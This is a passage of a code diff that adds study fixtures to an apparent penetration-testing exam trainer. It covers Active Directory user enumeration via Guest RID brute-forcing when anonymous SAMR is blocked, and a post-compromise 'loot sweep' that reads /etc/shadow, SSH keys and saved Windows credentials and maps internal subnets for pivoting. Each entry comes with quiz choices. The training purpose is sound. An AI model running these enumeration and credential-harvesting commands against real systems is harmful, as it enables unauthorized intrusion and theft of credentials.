+      "why": "On modern Windows Server builds, anonymous SMB sessions often connect fine while RestrictAnonymousSAM blocks unauthenticated SAMR user enumeration with NT_STATUS_ACCESS_DENIED. Instead of giving up on user discovery, you pivot around the SAMR block: test the Guest account with LSARPC RID cycling (--rid-brute), resolve SIDs directly through lsaenumsid/lookupnames, or feed any low-privilege credential you recovered from another service.",
+      "cmd": "nxc smb 10.10.10.10 -u 'guest' -p '' --rid-brute",
+      "tool": "nxc",
+      "output": "SMB  10.10.10.10  445  DC01  [+] acme.internal\\guest:\nSMB  10.10.10.10  445  DC01  500: ACME\\Administrator (SidTypeUser)\nSMB  10.10.10.10  445  DC01  1105: ACME\\jbloggs (SidTypeUser)",
+      "signal": "1105: ACME\\jbloggs (SidTypeUser)",
+      "teach": "When anonymous SAMR enumdomusers is denied, Guest RID brute-forcing over LSARPC often succeeds and hands you the full domain user list.",
+      "leadup": [
+        {
+          "key": "samr-denied",
+          "label": "Anonymous SAMR user enumeration returned NT_STATUS_ACCESS_DENIED",
+          "steps": [
+            {
+              "title": "Attempt anonymous rpcclient enumdomusers",
+              "tool": "rpcclient",
+              "where": "local",
+              "cmd": "rpcclient -U '' -N {{target}} -c 'enumdomusers'",
+              "out": "result was NT_STATUS_ACCESS_DENIED",
+              "sig": "NT_STATUS_ACCESS_DENIED",
+              "teach": "RestrictAnonymousSAM blocked anonymous SAMR, minting blocker.samr_null_denied."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Bypass RestrictAnonymousSAM by switching to Guest RID cycling, LSARPC SID translation, or an authenticated session.",
+        "items": [
+          {
+            "t": "Run Guest RID brute-forcing with NetExec",
+            "d": "Even when null sessions are blocked on SAMR, Guest with a blank password can often cycle RIDs via LSARPC.",
+            "demo": [
+              {
+                "run": "nxc smb {{target}} -u 'guest' -p '' --rid-brute",
+                "out": "SMB  {{target}}  445  DC01  500: ACME\\Administrator (SidTypeUser)\nSMB  {{target}}  445  DC01  1105: ACME\\jbloggs (SidTypeUser)",
+                "sig": "(SidTypeUser)"
+              }
+            ],
+            "note": "Recovers every domain user and group by RID."
+          },
+          {
+            "t": "Query LSARPC SID translation directly",
+            "d": "Use lsaenumsid and lookupnames to resolve well-known account names into the domain SID.",
+            "demo": [
+              {
+                "run": "rpcclient -U '' -N {{target}} -c 'lsaenumsid; lookupnames Administrator Guest krbtgt'",
+                "out": "Administrator S-1-5-21-1234567890-1234567890-1234567890-500 (User: 1)",
+                "sig": "S-1-5-21-"
+              }
+            ],
+            "note": "Extracts the domain SID even when SAMR is closed."
+          },
+          {
+            "t": "Re-run --users with a discovered credential",
+            "d": "Any valid domain user bypasses RestrictAnonymousSAM completely.",
+            "demo": [
+              {
+                "run": "nxc smb {{target}} -u '{{user}}' -p '{{password}}' --users",
+                "out": "SMB  {{target}}  445  DC01  acme.internal\\jbloggs              badPwdCount: 0",
+                "sig": "badPwdCount:"
+              }
+            ],
+            "note": "Authenticated SAMR dumps the full user list and descriptions."
+          }
+        ]
+      },
+      "situation": "You ran rpcclient -U '' -N 10.10.10.10 -c 'enumdomusers' and got result was NT_STATUS_ACCESS_DENIED. Which move works around this restriction?",
+      "choices": [
+        "fix-samr-null-denied",
+        "fix-clock-skew",
+        "ntlm-disabled-kerberos",
+        "fix-acl-reauth"
+      ],
+      "coach": {
+        "fix-clock-skew": "Clock skew applies to Kerberos KRB_AP_ERR_SKEW errors, not SAMR access denied.",
+        "ntlm-disabled-kerberos": "NTLM was not disabled; the server rejected anonymous access to the SAMR pipe.",
+        "fix-acl-reauth": "ACL reauth is for LDAP WriteDacl group resets, whereas here you need an alternative user-enumeration path."
+      }
+    },
+    "post-proof-loot-sweep": {
+      "why": "Capturing local.txt or proof.txt proves you compromised the current host, but on exam networks and multi-homed labs that host is also the bridge to the next target. Before you leave the shell, one fast sweep pulls the local password hashes, SSH keys, cached credentials, and secondary network interfaces (such as 172.16.x.x or 10.x.x.x subnets) so you never miss a pivot or a reused administrator password.",
+      "cmd": "cat /etc/shadow; ip -4 addr; ip route; arp -an",
+      "tool": "sh",
+      "output": "root:$6$rounds=656000$salt1234$abc123def456ghi789jkl012mno345pqr678stu901vwx234yz567890ABCD1234EFGH5678IJKL9012MNOP.:19700:0:99999:7:::\n2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500\n    inet 10.10.10.10/24 brd 10.10.10.255 scope global eth0\n3: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500\n    inet 172.16.5.10/24 brd 172.16.5.255 scope global eth1\ndefault via 10.10.10.1 dev eth0\n172.16.5.0/24 dev eth1 proto kernel scope link src 172.16.5.10\n? (172.16.5.20) at 00:50:56:b9:12:34 [ether] on eth1",
+      "signal": "inet 172.16.5.10/24 brd 172.16.5.255 scope global eth1",
+      "teach": "A post-proof sweep checks both credentials (/etc/shadow, SAM, SSH keys) and network topology (ip addr, ip route, arp -a) so a hidden internal subnet like 172.16.5.0/24 is spotted immediately.",
+      "leadup": [
+        {
+          "key": "proof-captured",
+          "label": "You captured local.txt or proof.txt on the host",
+          "steps": [
+            {
+              "title": "Capture proof.txt and confirm identity",
+              "tool": "sh",
+              "where": "target",
+              "cmd": "cat /root/proof.txt && id && ip -4 a",
+              "out": "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4\nuid=0(root) gid=0(root) groups=0(root)\ninet 10.10.10.10/24 scope global eth0",
+              "sig": "uid=0(root)",
+              "teach": "Once proof is recorded, sweep the box for credentials and internal network interfaces."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Run the one-shot credential and network interface sweep right after capturing the flag.",
+        "items": [
+          {
+            "t": "Sweep Linux hashes, keys, and network routes",
+            "d": "Collect /etc/shadow, SSH private keys, IP addresses, routing table, and ARP neighbors in one command.",
+            "demo": [
+              {
+                "run": "cat /etc/shadow 2>/dev/null; ip -4 addr; ip route; arp -an; cat /etc/hosts; find /root /home -maxdepth 3 -name 'id_*' 2>/dev/null",
+                "out": "inet 172.16.5.10/24 brd 172.16.5.255 scope global eth1\n? (172.16.5.20) at 00:50:56:b9:12:34 [ether] on eth1",
+                "sig": "172.16.5.10/24"
+              }
+            ],
+            "note": "eth1 on 172.16.5.0/24 with neighbor 172.16.5.20 reveals an internal pivot network."
+          },
+          {
+            "t": "Sweep Windows network adapters, routes, and saved credentials",
+            "d": "Run ipconfig /all, route print, arp -a, and cmdkey /list to spot dual-homed NICs and cached logins.",
+            "demo": [
+              {
+                "run": "ipconfig /all & route print & arp -a & cmdkey /list",
+                "out": "IPv4 Address. . . . . . . . . . . : 172.16.5.10(Preferred)\n  172.16.5.20           00-50-56-b9-12-34     dynamic",
+                "sig": "172.16.5.20"
+              }
+            ],
+            "note": "Pair with impacket-secretsdump from Kali to collect all SAM/LSA hashes."
+          }
+        ]
+      },
+      "situation": "You just captured proof.txt on a compromised host and need to check whether it holds credentials or routes to an internal subnet. Which move do you run?",
+      "choices": [
+        "post-proof-loot-sweep",
+        "flag-hunt-root-linux",
+        "flag-hunt-root-windows",
+        "nmap-fast-open-ports"
+      ],
+      "coach": {
+        "flag-hunt-root-linux": "You already captured proof.txt; now sweep for credentials and internal pivot routes.",
+        "flag-hunt-root-windows": "The proof flag is already captured; the next step is harvesting credentials and checking network interfaces.",
+        "nmap-fast-open-ports": "Before scanning externally, check the compromised host's own routing table, ARP cache, and credentials."
+      }
+    }
+  };
+  Object.keys(GAPFILL_2026_10).forEach(function (k) { OBOL.STUDY_FIXTURES[k] = Object.assign(OBOL.STUDY_FIXTURES[k] || {}, GAPFILL_2026_10[k]); });
 
 })(typeof globalThis !== 'undefined' ? globalThis : this);
